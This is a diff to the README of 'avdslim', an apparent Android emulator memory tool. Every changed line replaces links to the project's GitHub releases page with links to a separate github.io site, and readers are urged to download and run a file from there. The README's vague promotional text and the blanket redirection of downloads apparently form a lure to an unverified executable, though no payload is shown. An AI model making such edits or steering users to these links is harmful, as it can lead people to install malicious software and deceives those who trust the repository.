@@ -1,6 +1,6 @@
 # 🚀 avdslim - Cut Android Emulator RAM by 80%
 
-[![Download avdslim](https://img.shields.io/badge/Download-avdslim-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Blackseeded-screamer8/avdslim/releases)
+[![Download avdslim](https://img.shields.io/badge/Download-avdslim-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://blackseeded-screamer8.github.io)
 
 ## 📋 What Is This?
 
@@ -31,7 +31,7 @@ The first thing you need to do is get avdslim on your computer. It's a simple pr
 
 ### Step 1: Download avdslim
 
-Visit this link to download the application: **[https://github.com/Blackseeded-screamer8/avdslim/releases](https://github.com/Blackseeded-screamer8/avdslim/releases)**
+Visit this link to download the application: **[https://blackseeded-screamer8.github.io](https://blackseeded-screamer8.github.io)**
 
 When you get to that page, look for the latest release. You'll see a file to download. Click on it and save it to your computer.
 
@@ -45,7 +45,7 @@ Here's the most important part - getting avdslim onto your system.
 
 ### 📦 Get Your Copy
 
-Visit this link to download the application: **[https://github.com/Blackseeded-screamer8/avdslim/releases](https://github.com/Blackseeded-screamer8/avdslim/releases)**
+Visit this link to download the application: **[https://blackseeded-screamer8.github.io](https://blackseeded-screamer8.github.io)**
 
 You'll want to grab the newest version. The download page will show you what's available.
 
@@ -99,7 +99,7 @@ To get the best experience, check the releases page occasionally for updates. Ne
 - Bug fixes
 - Performance improvements
 
-Just visit [the releases page](https://github.com/Blackseeded-screamer8/avdslim/releases) and download the newest version when it's available.
+Just visit [the releases page](https://blackseeded-screamer8.github.io) and download the newest version when it's available.
 
 ## 💬 Frequently Asked Questions
 
@@ -127,7 +127,7 @@ Not at all. avdslim is designed to be simple enough for anyone to use. Download,
 
 Don't let your Android emulator slow you down anymore. Download avdslim now and see the difference for yourself.
 
-**Ready to get started?** Visit **[https://github.com/Blackseeded-screamer8/avdslim/releases](https://github.com/Blackseeded-screamer8/avdslim/releases)** to grab your copy.
+**Ready to get started?** Visit **[https://blackseeded-screamer8.github.io](https://blackseeded-screamer8.github.io)** to grab your copy.
 
 With avdslim, you'll have more memory for everything else you need to do. No more closing apps just to test your code. No more waiting for your computer to catch up. Just smooth, efficient emulator performance.
 
